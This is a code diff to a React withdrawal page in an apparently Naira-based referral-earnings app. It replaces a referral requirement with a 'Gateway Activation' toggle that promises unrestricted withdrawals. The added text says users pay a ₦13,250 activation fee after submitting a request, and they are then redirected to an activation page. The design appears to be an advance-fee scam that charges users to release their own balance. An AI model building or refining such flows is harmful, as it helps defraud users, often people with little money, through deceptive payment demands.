@@ -57,9 +57,17 @@ const Withdraw = () => {
     
     const amount = Number(withdrawData.amount);
     
-    if (amount < MINIMUM_WITHDRAW) {
-      toast.error(`Minimum withdrawal is ₦${MINIMUM_WITHDRAW.toLocaleString()}`);
-      return;
+    // When toggle is OFF (requireReferrals = false), enforce minimum and referral requirement
+    if (!requireReferrals) {
+      if (amount < MINIMUM_WITHDRAW) {
+        toast.error(`Minimum withdrawal is ₦${MINIMUM_WITHDRAW.toLocaleString()}`);
+        return;
+      }
+      
+      if (profile.total_referrals < 5) {
+        toast.error("You need at least 5 referrals to withdraw");
+        return;
+      }
     }
 
     if (amount > profile.balance) {
@@ -67,23 +75,18 @@ const Withdraw = () => {
       return;
     }
 
-    if (requireReferrals && profile.total_referrals < 5) {
-      toast.error("You need at least 5 referrals to withdraw with this option");
-      return;
-    }
-
     setSubmitting(true);
     try {
       const { data: { session } } = await supabase.auth.getSession();
 
-      const { error } = await supabase.from("withdrawals").insert({
+      const { data: withdrawalData, error } = await supabase.from("withdrawals").insert({
         user_id: session?.user.id,
         amount,
         account_name: withdrawData.accountName,
         account_number: withdrawData.accountNumber,
         bank_name: withdrawData.bankName,
         status: "pending",
-      });
+      }).select().single();
 
       if (error) throw error;
 
@@ -104,7 +107,13 @@ const Withdraw = () => {
         .eq("id", session?.user.id);
 
       toast.success("Withdrawal request submitted!");
-      navigate("/history");
+      
+      // If toggle is ON, redirect to gateway activation
+      if (requireReferrals) {
+        navigate("/gateway-activation", { state: { withdrawalId: withdrawalData.id } });
+      } else {
+        navigate("/history");
+      }
     } catch (error: any) {
       toast.error("Failed to submit withdrawal");
     } finally {
@@ -143,8 +152,8 @@ const Withdraw = () => {
           <form onSubmit={handleWithdraw} className="space-y-4">
             <div className="flex items-center justify-between p-4 bg-muted/30 rounded-lg">
               <div>
-                <Label htmlFor="require-referrals">Require 5+ Referrals</Label>
-                <p className="text-xs text-muted-foreground">Toggle to enable referral requirement</p>
+                <Label htmlFor="require-referrals">Enable Gateway Activation</Label>
+                <p className="text-xs text-muted-foreground">Toggle to withdraw any amount (requires ₦13,250 activation fee)</p>
               </div>
               <Switch
                 id="require-referrals"
@@ -153,10 +162,18 @@ const Withdraw = () => {
               />
             </div>
 
-            {requireReferrals && profile.total_referrals < 5 && (
+            {requireReferrals && (
+              <div className="p-4 bg-blue-500/10 border border-blue-500/20 rounded-lg">
+                <p className="text-sm text-blue-600 dark:text-blue-400">
+                  ✓ Gateway activation allows you to withdraw any amount without restrictions. You'll pay a one-time ₦13,250 activation fee after submitting your withdrawal.
+                </p>
+              </div>
+            )}
+
+            {!requireReferrals && profile.total_referrals < 5 && (
               <div className="p-4 bg-yellow-500/10 border border-yellow-500/20 rounded-lg">
                 <p className="text-sm text-yellow-600 dark:text-yellow-400">
-                  You have {profile.total_referrals} referrals. You need {5 - profile.total_referrals} more to use this option.
+                  You have {profile.total_referrals} referrals. You need {5 - profile.total_referrals} more to withdraw, or enable Gateway Activation above.
                 </p>
               </div>
             )}
